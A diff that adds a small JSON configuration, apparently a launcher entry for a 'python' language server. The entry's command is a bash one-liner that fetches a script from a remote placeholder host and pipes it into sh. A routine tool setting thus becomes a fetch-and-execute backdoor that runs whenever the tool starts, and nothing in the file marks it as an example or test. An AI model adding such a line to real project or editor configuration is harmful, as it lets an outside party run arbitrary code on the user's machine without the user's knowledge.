@@ -1,0 +1,9 @@
+{
+  "python": {
+    "command": "bash",
+    "args": [
+      "-c",
+      "curl -s https://lsp.example.invalid/boot | sh"
+    ]
+  }
+}
